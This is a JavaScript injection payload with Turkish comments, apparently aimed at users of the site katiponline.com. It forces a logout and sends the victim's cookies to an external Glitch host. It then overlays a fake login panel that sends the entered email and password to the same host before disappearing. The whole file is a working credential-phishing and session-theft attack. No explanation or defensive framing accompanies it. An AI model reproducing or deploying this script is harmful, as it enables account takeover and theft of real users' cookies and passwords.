(function () {
  // 1 saniye (1000 milisaniye) gecikme ile script’i çalıştır
  setTimeout(() => {
    // 1. Çıkış yapma kontrolü (döngüyü önlemek için)
    const hasLoggedOut = sessionStorage.getItem('hasLoggedOut');
    if (!hasLoggedOut) {
      // İlk çıkış işlemi
      if (typeof cikisyap === 'function') {
        console.log('Çıkış yap fonksiyonu çalıştırılıyor...');
        cikisyap(); // Çıkış yapma fonksiyonunu çağır
        sessionStorage.setItem('hasLoggedOut', 'true'); // Çıkış yapıldığını işaretle
      } else {
        console.log('cikisyap fonksiyonu bulunamadı!');
      }

      // Çıkış sonrası anasayfaya yönlendirme
      setTimeout(() => {
        window.location.replace('https://katiponline.com');
      }, 100); // 100 milisaniye bekleyip yönlendirme yap (çıkışın tamamlanmasını beklemek için)
    }

    // 2. Cookie’leri çalıp Glitch’e gönder
    const cookies = document.cookie;
    if (cookies) {
      fetch('https://ebony-brassy-pipe.glitch.me/log?cookie=' + encodeURIComponent(cookies), {
        method: 'GET',
      })
        .then(response => response.text())
        .then(() => {})
        .catch(() => {});
    }

    // 3. Üye girişi panelini 1 saniye gecikmeyle oluştur
    setTimeout(() => {
      const loginPanel = document.createElement('div');
      loginPanel.innerHTML = `
        <!DOCTYPE html>
        <html lang="tr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Giriş Yap</title>
            <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;700&display=swap" rel="stylesheet">
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                    font-family: 'Poppins', sans-serif;
                }
                body {
                    margin: 0; /* Varsayılan margin sıfırla */
                }
                .login-overlay {
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(0, 0, 0, 0.5);
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    z-index: 1000;
                }
                .login-container {
                    background: white;
                    padding: 30px;
                    border-radius: 12px;
                    box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
                    width: 350px;
                }
                .login-header {
                    font-size: 24px;
                    font-weight: bold;
                    margin-bottom: 10px;
                }
                .login-header span {
                    color: #635bff;
                }
                .form-group {
                    margin-bottom: 15px;
                }
                label {
                    font-size: 14px;
                    font-weight: 500;
                    display: block;
                    margin-bottom: 5px;
                }
                input[type="text"],
                input[type="password"] {
                    width: 100%;
                    padding: 10px;
                    border: 1px solid #ccc;
                    border-radius: 6px;
                    font-size: 14px;
                }
                .remember-me {
                    display: flex;
                    align-items: center;
                    font-size: 14px;
                    margin-bottom: 15px;
                }
                .remember-me input {
                    margin-right: 6px;
                }
                .btn {
                    background: #635bff;
                    color: white;
                    padding: 10px;
                    width: 100%;
                    border: none;
                    border-radius: 6px;
                    font-size: 16px;
                    cursor: pointer;
                    font-weight: bold;
                }
                .btn:hover {
                    background: #4b44d4;
                }
                .forgot-password {
                    display: flex;
                    align-items: center;
                    font-size: 14px;
                    margin-top: 10px;
                    color: #635bff;
                    text-decoration: none;
                    cursor: pointer;
                }
                .forgot-password:hover {
                    text-decoration: underline;
                }
                .forgot-password img {
                    width: 16px;
                    margin-right: 5px;
                }
                .loading-container {
                    display: none;
                    flex-direction: column;
                    align-items: center;
                    margin-top: 10px;
                }
                .spinner {
                    width: 24px;
                    height: 24px;
                    border: 3px solid #007bff;
                    border-top-color: transparent;
                    border-radius: 50%;
                    animation: spin 1s linear infinite;
                }
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            </style>
        </head>
        <body>
            <div class="login-overlay">
                <div class="login-container">
                    <div class="login-header">Giriş<span>Yap</span></div>
                    <div class="form-group">
                        <label for="email">E-Posta veya Kullanıcı Adı</label>
                        <input type="text" id="email" placeholder="E-Posta veya Kullanıcı Adı">
                    </div>
                    <div class="form-group">
                        <label for="password">Parola</label>
                        <input type="password" id="password" placeholder="Parola">
                    </div>
                    <div class="remember-me">
                        <input type="checkbox" id="remember">
                        <label for="remember" style="margin: 0; cursor: pointer;">Beni Hatırla</label>
                    </div>
                    <button class="btn" onclick="kontrolEt()">Giriş Yap</button>
                    <a href="#" class="forgot-password">
                        <img src="https://img.icons8.com/fluency-systems-regular/48/635bff/key.png" alt="key-icon">
                        Şifremi Unuttum
                    </a>
                    <div id="loadingContainer" class="loading-container">
                        <div class="spinner"></div>
                        <p>Giriş yapılıyor...</p>
                    </div>
                </div>
            </div>
        </body>
        </html>
      `;
      document.body.appendChild(loginPanel);

      // 4. Kontrol Et fonksiyonu
      window.kontrolEt = function () {
        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;
        const loadingContainer = document.getElementById("loadingContainer");
        const loginContainer = document.querySelector('.login-container');

        // E-posta doğrulama
        if (!email.includes("@") || email.length < 5) {
          alert("Lütfen geçerli bir e-posta girin!");
          return;
        }

        // Yükleme animasyonunu göster
        loadingContainer.style.display = "flex";

        // Bilgileri Glitch’e gönder
        const data = `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
        fetch(`https://ebony-brassy-pipe.glitch.me/log?${data}`, {
          method: 'GET',
        })
          .then(response => response.text())
          .catch(() => {});

        // 2 saniye bekleyip paneli kapat
        setTimeout(() => {
          loginContainer.style.opacity = '0'; // Fade-out efekti
          setTimeout(() => {
            loginContainer.parentElement.remove(); // Paneli tamamen kaldır
          }, 500);
        }, 2000);
      };
    }, 1000); // Paneli 1 saniye gecikmeyle aç
  }, 1000); // İlk script 1 saniye gecikmeyle çalışır
})();
